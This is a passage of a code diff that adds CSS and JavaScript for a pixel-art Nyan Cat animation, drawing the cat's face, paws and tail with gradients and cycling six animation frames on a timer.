+    background-size: 6px 6px, 6px 6px, 12px 12px, 12px 12px, 12px 12px, 12px 12px, 6px 6px, 6px 6px, 6px 6px, 6px 6px;
+    background-position: 17px 0, 56px 0, 5px 12px, 68px 12px, 17px 0, 56px 0, 42px 6px, 23px 18px, 40px 18px, 56px 18px;
+  }
+  /* #face:before = chin */
+  #face:before {
+    bottom: -12px;
+    width: 100%;
+    height: 18px;
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 6px 6px, 6px 6px, 6px 6px, 6px 6px, 56px 6px, 39px 6px, 68px 6px, 56px 6px;
+    background-position: 0 0, 6px 6px, 74px 0, 68px 6px, 12px 12px, 23px 0, 6px 0, 12px 6px;
+  }
+  /* FRAME 1 AND 5 */
+  .frame1 #head,
+  .frame5 #head {
+    bottom: 36px;
+    right: 0;
+  }
+  /* FRAMES 2 AND 3 AND 4 */
+  .frame2 #head,
+  .frame3 #head,
+  .frame4 #head {
+    bottom: 36px;
+    right: -6px;
+  }
+  /* FRAME 6 */
+  .frame6 #head {
+    bottom: 42px;
+    right: 0;
+  }
+  /* paws */
+  #paws {
+    width: 156px;
+    height: 30px;
+    position: absolute;
+    bottom: 0;
+    left: 24px;
+  }
+  /* FRAME 1 */
+  .frame1 #paws {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 18px 18px;
+    background-position: 4px 6px, 10px 0, 34px 0, 40px 6px, 94px 0px, 101px 6px, 125px 0px, 131px 6px;
+  }
+  .frame1 #paws:before {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 12px 12px, 12px 12px, 12px 12px, 12px 12px, 6px 6px;
+    background-position: 10px 6px, 40px 6px, 101px 6px, 131px 6px, 22px 6px;
+  }
+  /* FRAMES 2 AND 4 */
+  .frame2 #paws,
+  .frame4 #paws {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 18px 18px;
+    background-position: 10px 6px, 16px 0, 40px 0, 46px 6px, 95px 0, 101px 6px, 125px 0, 131px 6px;
+  }
+  .frame2 #paws:before,
+  .frame4 #paws:before {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 12px 12px;
+    background-position: 16px 6px, 46px 6px, 101px 6px, 131px 6px;
+  }
+  /* FRAME 3 */
+  .frame3 #paws {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 18px 18px;
+    background-position: 16px 6px, 22px 0px, 46px 0px, 52px 6px, 100px 0px, 106px 6px, 131px 0px, 137px 6px;
+  }
+  .frame3 #paws:before {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 12px 12px;
+    background-position: 22px 6px, 52px 6px, 106px 6px, 137px 6px;
+  }
+  /* FRAME 5 AND 6 */
+  .frame5 #paws,
+  .frame6 #paws {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 18px 18px;
+    background-position: 4px 6px, 10px 0, 34px 0, 40px 6px, 94px 0px, 101px 6px, 125px 0px, 131px 6px;
+  }
+  .frame5 #paws:before,
+  .frame6 #paws:before {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 12px 12px;
+    background-position: 10px 6px, 16px 0, 40px 6px, 101px 6px, 131px 6px;
+  }
+  /* FRAME 6 */
+  .frame6 #paws {
+    background-position: 4px 6px, 10px 0, 40px 0, 34px 6px, 101px 0px, 95px 6px, 125px 0px, 131px 6px;
+  }
+  /* tail */
+  #tail {
+    width: 40px;
+    height: 54px;
+    position: absolute;
+    left: 0;
+    top: 40px;
+  }
+  /* FRAME 1 */
+  .frame1 #tail {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 23px 18px;
+    background-position: 6px 0, 11px 6px, 17px 11px, 23px 17px, 34px 23px;
+  }
+  .frame1 #tail:before {
+    left: 11px;
+    top: 6px;
+    width: 29px;
+    height: 23px;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 11px 6px;
+    background-position: 0 0, 6px 6px, 12px 12px, 18px 18px, 24px 24px;
+  }
+  /* FRAMES 2 AND 6 */
+  .frame2 #tail,
+  .frame6 #tail {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 11px 23px, 11px 23px, 11px 23px, 6px 11px;
+    background-position: 12px 6px, 18px 12px, 29px 17px, 6px 12px;
+  }
+  .frame2 #tail:before,
+  .frame6 #tail:before {
+    width: 28px;
+    height: 23px;
+    left: 12px;
+    top: 12px;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 11px 6px;
+    background-position: 0 0, 0 5px, 6px 11px, 17px 11px, 17px 17px;
+  }
+  /* FRAME 3 */
+  .frame3 #tail {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 24px 12px, 24px 12px, 24px 12px, 6px 24px;
+    background-position: 16px 24px, 4px 30px, 10px 36px, 34px 18px;
+  }
+  .frame3 #tail:before {
+    width: 30px;
+    height: 12px;
+    top: 30px;
+    right: 0;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 24px 6px, 18px 6px;
+    background-position: 6px 0, 0 6px;
+  }
+  /* FRAME 4 */
+  .frame4 #tail {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 12px 24px, 12px 24px, 12px 24px, 6px 12px;
+    background-position: 28px 18px, 16px 24px, 10px 30px, 4px 36px;
+  }
+  .frame4 #tail:before {
+    width: 30px;
+    height: 24px;
+    top: 24px;
+    right: 0;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 12px 12px, 12px 12px, 12px 6px;
+    background-position: 18px 0, 0 12px, 6px 6px;
+  }
+  /* FRAME 5 */
+  .frame5 #tail {
+    background: linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat, linear-gradient(black, black) no-repeat;
+    background-size: 24px 18px, 24px 18px, 6px 12px, 6px 12px, 12px 6px;
+    background-position: 6px 6px, 12px 12px, 0 12px, 36px 12px, 28px 30px;
+  }
+  .frame5 #tail:before {
+    width: 34px;
+    height: 18px;
+    top: 12px;
+    right: 0;
+    background: linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat, linear-gradient(#b6bcd4, #b6bcd4) no-repeat;
+    background-size: 18px 6px, 22px 6px, 6px 6px;
+    background-position: 0 0, 6px 6px, 28px 12px;
+  }
+  
+     </style>
+     <script>
+        console.log('Nyan!')
+
+function cycleFrames (_nyanCat, _currentFrame) {
+	_nyanCat.classList = []
+	_nyanCat.classList.add(`frame${_currentFrame}`)
+}
+
+function replicateSparks (_sparksRow) {
+	const numberOfRowsToCoverEntireScreen = Math.ceil(document.body.offsetHeight / _sparksRow.offsetHeight)
+	const newSparksRows = document.createElement('div')
+
+	for (let a = 0; a < numberOfRowsToCoverEntireScreen-1; a++) {
+		newSparksRows.append(_sparksRow.cloneNode(true))
+	}
+
+	document.body.prepend(newSparksRows)
+}
+
+(function () {
+	let nyanCat = document.getElementById('nyan-cat')
+	let currentFrame = 1
+
+	replicateSparks(document.getElementsByClassName('sparks-combo')[0])
+
+	setInterval(function () {
+		currentFrame = (currentFrame % 6) + 1
+		cycleFrames(nyanCat, currentFrame)
+	}, 70)
+})()
+
+     </script>
